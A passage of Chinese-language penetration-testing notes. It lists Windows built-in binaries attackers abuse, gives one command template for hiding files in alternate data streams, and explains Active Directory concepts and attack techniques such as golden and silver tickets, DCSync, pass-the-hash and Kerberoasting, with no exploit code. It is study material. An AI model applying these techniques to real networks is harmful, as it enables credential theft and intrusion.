&lt;p&gt;msbuild.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;构建应用程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mshta.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTML 应用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;msiexec.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装 msi&lt;/li&gt;
&lt;li&gt;加载 dll&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;msxsl.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;处理 XSL 程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;netsh.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;installutil.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装 / 卸载程序组件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IEExec.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.NET Framework 附带程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;powershell.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;psexec.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wc2V4ZWM=&#34;&gt;https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;reg.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注册表控制台&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;regedit.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注册表修改&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;regsvr32.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注册动态链接库 / ActiveX 控件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;rundll32.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;执行 DLL 文件中的内部函数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sc.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查看服务状态管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;schtasks.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定时计划任务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;shred&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;重复写入文件，防止文件恢复&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;type.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用 ads 隐藏文件  &lt;code&gt;type &amp;lt;filepath&amp;gt; &amp;lt;target_file:ads&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;wmic.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows 管理工具&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;windbg.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;winrm.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;wscript.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;脚本引擎&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;waitfor.exe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用于同步网络中计算机，可以发送或等待系统上的信号。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;msprc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msprc&#34;&gt;#&lt;/a&gt; MSPRC&lt;/h1&gt;
&lt;p&gt;MSRPC (Microsoft Remote Procedure Call) 是微软对 DCE/RPC 协议的修改实现，用于支持 Windows 系统中应用程序的远程网络调用。&lt;/p&gt;
&lt;p&gt;MSRPC 所使用的端口有 UDP 135 和 TCP 139 / 445 。&lt;/p&gt;
&lt;p&gt;MSRPC 可以用于&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户遍历&lt;/li&gt;
&lt;li&gt;服务遍历&lt;/li&gt;
&lt;li&gt;凭证导出&lt;/li&gt;
&lt;li&gt;横向移动&lt;/li&gt;
&lt;li&gt;权限提升&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;域渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域渗透&#34;&gt;#&lt;/a&gt; 域渗透&lt;/h1&gt;
&lt;h2 id=&#34;用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户&#34;&gt;#&lt;/a&gt; 用户&lt;/h2&gt;
&lt;h3 id=&#34;用户组与工作组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户组与工作组&#34;&gt;#&lt;/a&gt; 用户组与工作组&lt;/h3&gt;
&lt;h4 id=&#34;用户-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户-2&#34;&gt;#&lt;/a&gt; 用户&lt;/h4&gt;
&lt;p&gt;Windows 系统存在一些为了特定用途而设置的用户，分别是：SYSTEM (系统)、Trustedinstaller (信任程序模块)、Everyone (所有人)、Creator Owner (创建者) 等，这些特殊用户不属于任何用户组，是完全独立的账户。其中 SYSTEM 拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。&lt;/p&gt;
&lt;h4 id=&#34;用户组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户组&#34;&gt;#&lt;/a&gt; 用户组&lt;/h4&gt;
&lt;p&gt;Windows 系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。&lt;/p&gt;
&lt;p&gt;默认情况下，系统为用户分了 7 个组，并给每个组赋予不同的操作权限。这些组为：管理员组 (Administrators)、高权限用户组 (Power Users)、普通用户组 (Users)、备份操作组 (Backup Operators)、文件复制组 (Replicator)、来宾用户组 (Guests)、身份验证用户组 (Authenticated Users)。&lt;/p&gt;
&lt;h4 id=&#34;工作组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工作组&#34;&gt;#&lt;/a&gt; 工作组&lt;/h4&gt;
&lt;p&gt;工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为 workgroup 的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。&lt;/p&gt;
&lt;h3 id=&#34;域中用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域中用户&#34;&gt;#&lt;/a&gt; 域中用户&lt;/h3&gt;
&lt;h4 id=&#34;域用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域用户&#34;&gt;#&lt;/a&gt; 域用户&lt;/h4&gt;
&lt;p&gt;域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用 SID (Security Identifier) 来表明身份，用 NTLM 哈希或者 Kerberos 来验证身份。&lt;/p&gt;
&lt;h4 id=&#34;机器用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#机器用户&#34;&gt;#&lt;/a&gt; 机器用户&lt;/h4&gt;
&lt;p&gt;机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以  &lt;code&gt;$&lt;/code&gt;  结尾。&lt;/p&gt;
&lt;h3 id=&#34;组策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#组策略&#34;&gt;#&lt;/a&gt; 组策略&lt;/h3&gt;
&lt;p&gt;组策略 (Group Policy) 用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略 (LGPO 或 LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作 GPO (Group Policy Object)。&lt;/p&gt;
&lt;h2 id=&#34;内网常用协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网常用协议&#34;&gt;#&lt;/a&gt; 内网常用协议&lt;/h2&gt;
&lt;p&gt;Windows 查询名称解析的顺序为 DNS、mDNS、LLMNR、NBNS。&lt;/p&gt;
&lt;h3 id=&#34;netbios&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netbios&#34;&gt;#&lt;/a&gt; NetBIOS&lt;/h3&gt;
&lt;p&gt;NetBIOS（Network Basic Input/Output System）是基于网络的交互协议，通常使用 UDP 137、UDP 138、TCP 139 等端口。Windows 在安装 TCP/IP 协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。&lt;/p&gt;
&lt;p&gt;基于 NetBIOS 有 NBNS (NetBIOS Name Service) 服务，通常监听在 UDP 137 端口，该服务提供三种功能：将 NetBIOS 名称解析到 IP、查询某一个 NetBIOS 节点的状态，注册 / 释放一个 NetBIOS 名。&lt;/p&gt;
&lt;p&gt;可以使用  &lt;code&gt;nbtstat&lt;/code&gt;  工具利用 NetBIOS 协议管理网络。&lt;/p&gt;
&lt;h3 id=&#34;llmnr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#llmnr&#34;&gt;#&lt;/a&gt; LLMNR&lt;/h3&gt;
&lt;p&gt;链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR) 是一个基于 DNS 数据包格式的协议，IPv4 和 IPv6 的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在 Windows Vista 后被引入。 LLMNR 监听 UDP 5355 端口，可以通过多播地址 224.0.0.252 (或  &lt;code&gt;FF02:0:0:0:0:0:1:3&lt;/code&gt; ) 访问。&lt;/p&gt;
&lt;h3 id=&#34;mdns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mdns&#34;&gt;#&lt;/a&gt; mDNS&lt;/h3&gt;
&lt;p&gt;mDNS (multicast DNS) 在 Windows 10 中被引入，监听 UDP 5353 端口，对应的多播地址为 224.0.0.251 (  &lt;code&gt;FF02::FB&lt;/code&gt;  ) 。mDNS 主要实现了在没有传统 DNS 服务器的情况下使局域网内的主机实现相互发现和通信。&lt;/p&gt;
&lt;h3 id=&#34;wpad&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wpad&#34;&gt;#&lt;/a&gt; WPAD&lt;/h3&gt;
&lt;p&gt;网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用 DHCP 和 / 或 DNS 发现方法来定位一个配置文件 URL 的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定 URL 应使用的代理。&lt;/p&gt;
&lt;h2 id=&#34;域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域&#34;&gt;#&lt;/a&gt; 域&lt;/h2&gt;
&lt;h3 id=&#34;域结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域结构&#34;&gt;#&lt;/a&gt; 域结构&lt;/h3&gt;
&lt;h4 id=&#34;域树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域树&#34;&gt;#&lt;/a&gt; 域树&lt;/h4&gt;
&lt;p&gt;域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）。&lt;/p&gt;
&lt;h4 id=&#34;林&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#林&#34;&gt;#&lt;/a&gt; 林&lt;/h4&gt;
&lt;p&gt;林（Forests）是一个复杂的 AD 实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。&lt;/p&gt;
&lt;h3 id=&#34;域控制器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域控制器&#34;&gt;#&lt;/a&gt; 域控制器&lt;/h3&gt;
&lt;p&gt;ADDS 的目录存储在域控制器 (Domain Controller) 内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库。&lt;/p&gt;
&lt;p&gt;在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。&lt;/p&gt;
&lt;p&gt;AD 数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）。&lt;/p&gt;
&lt;p&gt;多主机模式可以直接更新任何一台域控制器内的 AD 对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。&lt;/p&gt;
&lt;p&gt;单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。&lt;/p&gt;
&lt;h3 id=&#34;信任&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信任&#34;&gt;#&lt;/a&gt; 信任&lt;/h3&gt;
&lt;p&gt;两个域之间需要创建信任关系，才可以访问对应域内的资源。&lt;/p&gt;
&lt;h4 id=&#34;域信任类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域信任类型&#34;&gt;#&lt;/a&gt; 域信任类型&lt;/h4&gt;
&lt;p&gt;Active Directory 的信任方式可以分为以下几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tree-Root Trust
&lt;ul&gt;
&lt;li&gt;双向具有转移性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Parent-Child Trust
&lt;ul&gt;
&lt;li&gt;具有转移性，双向行人&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Forest Trust
&lt;ul&gt;
&lt;li&gt;如果两个林创建了信任关系，则林中所有的域都相互信任&lt;/li&gt;
&lt;li&gt;两个林之间的信任关系无法自动扩展到其他林上&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Realm Trust
&lt;ul&gt;
&lt;li&gt;ADDS 域可以和非 Windows 系统的 Kerberos 域之间创建信任&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;External Trust
&lt;ul&gt;
&lt;li&gt;位于两个林内的域之间可以通过外部信任来创建信任关系&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shortcut Trust
&lt;ul&gt;
&lt;li&gt;可以缩短验证用户身份的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ou&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ou&#34;&gt;#&lt;/a&gt; OU&lt;/h3&gt;
&lt;p&gt;组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU 包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。&lt;/p&gt;
&lt;h2 id=&#34;active-directory&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#active-directory&#34;&gt;#&lt;/a&gt; Active Directory&lt;/h2&gt;
&lt;p&gt;活动目录 (Active Directory，AD) 是面向 Windows Server 的目录服务。Active Directory 存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。&lt;/p&gt;
&lt;h3 id=&#34;adds&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#adds&#34;&gt;#&lt;/a&gt; ADDS&lt;/h3&gt;
&lt;p&gt;Active Directory 提供目录服务的组件被称作 Active Directory 域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。&lt;/p&gt;
&lt;p&gt;从逻辑上看，ADDS 的组件可以分为 Partition、Schema、Domain、Domain tree、Forest、OU、Container。&lt;/p&gt;
&lt;p&gt;Partition 也被称为 naming context，是 AD DS 数据库的一部分。Schema 是存储在 ADDS 中数据的定义。Container 是为 ADDS 提供组织框架的对象。&lt;/p&gt;
&lt;p&gt;从实现上区分，ADDS 可以分为 Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。&lt;/p&gt;
&lt;p&gt;每个域控制器都有完整的 ADDS 数据，每个域控都可以处理数据的修改并同步至其他的域控。&lt;/p&gt;
&lt;p&gt;域控会有一份数据拷贝 (Data store) ，默认存储在  &lt;code&gt;C:\Windows\NTDS&lt;/code&gt;  目录下。&lt;/p&gt;
&lt;p&gt;Global catalog server 是存储全局 catalog 的域控，catlog 以只读的方式存储了一个 multiple-domain forest 的所有对象，用于加速搜索。&lt;/p&gt;
&lt;h3 id=&#34;名称空间&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#名称空间&#34;&gt;#&lt;/a&gt; 名称空间&lt;/h3&gt;
&lt;p&gt;名称空间 (namespace) 是一块界定好的区域，在区域内可以用名称找到与之相关的信息。&lt;/p&gt;
&lt;h3 id=&#34;对象与属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#对象与属性&#34;&gt;#&lt;/a&gt; 对象与属性&lt;/h3&gt;
&lt;p&gt;ADDS 内的资源都是以对象 (Object) 的形式存在的，对象通过属性 (Attrbute) 来描述其特征。&lt;/p&gt;
&lt;h2 id=&#34;adcs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#adcs&#34;&gt;#&lt;/a&gt; ADCS&lt;/h2&gt;
&lt;h3 id=&#34;介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h3&gt;
&lt;p&gt;Active Directory 证书服务 (Active Directory Certificate Services，AD CS) 是微软用于实现 PKI 的服务。&lt;/p&gt;
&lt;h3 id=&#34;证书&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书&#34;&gt;#&lt;/a&gt; 证书&lt;/h3&gt;
&lt;p&gt;ADCS 中的证书是 X.509 格式的数字签名文档，用于加密、签名或身份验证等。&lt;/p&gt;
&lt;p&gt;证书常用的属性由下述字段组成&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Subject：主题&lt;/li&gt;
&lt;li&gt;Public Key：公钥&lt;/li&gt;
&lt;li&gt;Extended Key Usages (EKUs)：扩展密钥，描述证书的对象标识符 (Object identifier, OID)&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常用的 EKU OID 包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;代码签名
&lt;ul&gt;
&lt;li&gt;OID 1.3.6.1.5.5.7.3.3&lt;/li&gt;
&lt;li&gt;证书用于签署可执行代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;加密文件系统
&lt;ul&gt;
&lt;li&gt;OID 1.3.6.1.4.1.311.10.3.4&lt;/li&gt;
&lt;li&gt;证书用于加密文件系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安全电子邮件
&lt;ul&gt;
&lt;li&gt;OID 1.3.6.1.5.5.7.3.4&lt;/li&gt;
&lt;li&gt;证书用于加密电子邮件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;客户端身份验证
&lt;ul&gt;
&lt;li&gt;OID 1.3.6.1.5.5.7.3.2&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;智能卡登录
&lt;ul&gt;
&lt;li&gt;OID 1.3.6.1.4.1.311.20.2.2&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;服务器认证
&lt;ul&gt;
&lt;li&gt;OID 1.3.6.1.5.5.7.3.1&lt;/li&gt;
&lt;li&gt;证书用于识别服务器 (例如 HTTPS 证书)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;证书模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书模板&#34;&gt;#&lt;/a&gt; 证书模板&lt;/h4&gt;
&lt;p&gt;微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息。&lt;/p&gt;
&lt;h4 id=&#34;证书注册&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书注册&#34;&gt;#&lt;/a&gt; 证书注册&lt;/h4&gt;
&lt;p&gt;证书可以通过以下几种方式注册：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过 Windows 客户端证书注册协议 (MS-WCCE)&lt;/li&gt;
&lt;li&gt;通过 ICertPassage 远程协议 (MS-ICPR)&lt;/li&gt;
&lt;li&gt;在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册&lt;/li&gt;
&lt;li&gt;在服务器安装了对应服务时，通过证书注册服务 (CES) 注册&lt;/li&gt;
&lt;li&gt;在服务器安装了对应服务时，使用网络设备注册服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;组策略-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#组策略-2&#34;&gt;#&lt;/a&gt; 组策略&lt;/h2&gt;
&lt;h3 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。&lt;/p&gt;
&lt;p&gt;组策略有以下功能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;管理注册表&lt;/li&gt;
&lt;li&gt;设置脚本&lt;/li&gt;
&lt;li&gt;重定向文件夹&lt;/li&gt;
&lt;li&gt;管理应用程序&lt;/li&gt;
&lt;li&gt;指定安全选项&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常用概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用概念&#34;&gt;#&lt;/a&gt; 常用概念&lt;/h3&gt;
&lt;p&gt;组策略容器 (Group Policy Container，GPC) 存储在活动目录中，包含 GPO 属性、配置信息和版本等。可以通过 GPC 来查找 GPT。&lt;/p&gt;
&lt;p&gt;组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。&lt;/p&gt;
&lt;p&gt;其中 GPC 中的信息量少、容量小，GPT 中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。&lt;/p&gt;
&lt;p&gt;组策略对象 (Group Policy Object, GPO) 是包含多种 Windows 组策略设置的集合，存储在 GPC 和 GPT 中。&lt;/p&gt;
&lt;h2 id=&#34;域内攻击思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域内攻击思路&#34;&gt;#&lt;/a&gt; 域内攻击思路&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;获取域控权限
&lt;ul&gt;
&lt;li&gt;通过域控相关漏洞&lt;/li&gt;
&lt;li&gt;抓 hash，尤其是域管理员、运维等高权限账号的哈希&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;控制入域机器
&lt;ul&gt;
&lt;li&gt;下发恶意策略控制&lt;/li&gt;
&lt;li&gt;获取域内用户凭证&lt;/li&gt;
&lt;li&gt;利用错误的域管理配置&lt;/li&gt;
&lt;li&gt;域内 relay&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;获取服务票据
&lt;ul&gt;
&lt;li&gt;攻击 Exchange 等服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;攻击类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击类型&#34;&gt;#&lt;/a&gt; 攻击类型&lt;/h2&gt;
&lt;h3 id=&#34;黄金票据利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黄金票据利用&#34;&gt;#&lt;/a&gt; 黄金票据利用&lt;/h3&gt;
&lt;p&gt;在认证过程中，经过 client 与 AS 的通信会得到 TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。&lt;/p&gt;
&lt;p&gt;黄金票据利用需要与 DC 通信，且需要获取 krbtgt 的 hash，但是可以获取任何 Kerbose 服务权限。&lt;/p&gt;
&lt;h3 id=&#34;白银票据利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#白银票据利用&#34;&gt;#&lt;/a&gt; 白银票据利用&lt;/h3&gt;
&lt;p&gt;白银票据（Silver Tickets）伪造利用的是 Kerberos 认证中的第三个步骤，在第三步的时候，client 会带着 ticket 向 server 的某个服务进行请求，如果验证通过就可以访问 server 上的指定服务了，这里的 ticket 是基于 client info、server session key、end time、server hash。这里 client info 已知，end time 可以构造，server session key 是 TGS 生成的，所以只要 server 的 NTLM hash 即可。银票伪造的是 TGS，只能访问指定的服务。&lt;/p&gt;
&lt;h3 id=&#34;dcsync攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dcsync攻击&#34;&gt;#&lt;/a&gt; DCSync 攻击&lt;/h3&gt;
&lt;p&gt;域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb3BlbnNwZWNzL3dpbmRvd3NfcHJvdG9jb2xzL21zLWRyc3IvZjk3N2ZhYWEtNjczZS00ZjY2LWI5YmYtNDhjNjQwMjQxZDQ3&#34;&gt;DRSR&lt;/span&gt; 的同步机制。&lt;/p&gt;
&lt;p&gt;在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程。&lt;/p&gt;
&lt;p&gt;DCSync 就是使用这种机制进行域渗透的技术，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，在 2015 年添加到 mimikatz 的一个功能，可以导出域内所有用户的 hash。&lt;/p&gt;
&lt;p&gt;这种方式需要满足以下任一一种权限：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Administrators 组内的用户&lt;/li&gt;
&lt;li&gt;Domain Admins 组内的用户&lt;/li&gt;
&lt;li&gt;Enterprise Admins 组内的用户&lt;/li&gt;
&lt;li&gt;域控制器的计算机帐户&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;或者拥有特定的几条 DACL:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DS-Replication-Get-Changes&lt;/li&gt;
&lt;li&gt;DS-Replication-Get-Changes-All&lt;/li&gt;
&lt;li&gt;DS-Replication-Get-Changes-In-Filtered-Set&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync 。&lt;/p&gt;
&lt;p&gt;对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击。&lt;/p&gt;
&lt;h3 id=&#34;dcshadow攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dcshadow攻击&#34;&gt;#&lt;/a&gt; DCShadow 攻击&lt;/h3&gt;
&lt;p&gt;DCShadow 是由来自法国的安全研究人员 Benjamin Delpy 和 Vincent Le Toux 在 2018 年的微软蓝帽（Blue Hat）大会上提出。&lt;/p&gt;
&lt;p&gt;DCShadow 攻击指在 Active Directory 环境下创建一个恶意的域控制器，并用它来推送恶意对象。&lt;/p&gt;
&lt;h3 id=&#34;哈希传递攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#哈希传递攻击&#34;&gt;#&lt;/a&gt; 哈希传递攻击&lt;/h3&gt;
&lt;p&gt;哈希传递攻击（Pass-the-Hash，PTH）是通过传递 NTLM 哈希来认证的攻击方法，常用的工具有 mimikatz 等。&lt;/p&gt;
&lt;h3 id=&#34;票据传递攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#票据传递攻击&#34;&gt;#&lt;/a&gt; 票据传递攻击&lt;/h3&gt;
&lt;p&gt;票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用黄金票据和白银票据，通过 PtT 访问主机相当简单。&lt;/p&gt;
&lt;h3 id=&#34;kerberoasting-attacks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kerberoasting-attacks&#34;&gt;#&lt;/a&gt; Kerberoasting Attacks&lt;/h3&gt;
&lt;p&gt;Kerberoasting 攻击由 Tim Medin 在 2014 DerbyCon conference 上 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1QVXlobE4tRTVNVQ==&#34;&gt;公开&lt;/span&gt; 。指域内的任何一台主机，都可以通过查询 SPN，Kerberoasting 即是向域内的所有服务请求 TGS，然后进行暴力破解。&lt;/p&gt;
&lt;h4 id=&#34;roasting-as-rep&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#roasting-as-rep&#34;&gt;#&lt;/a&gt; Roasting AS-REP&lt;/h4&gt;
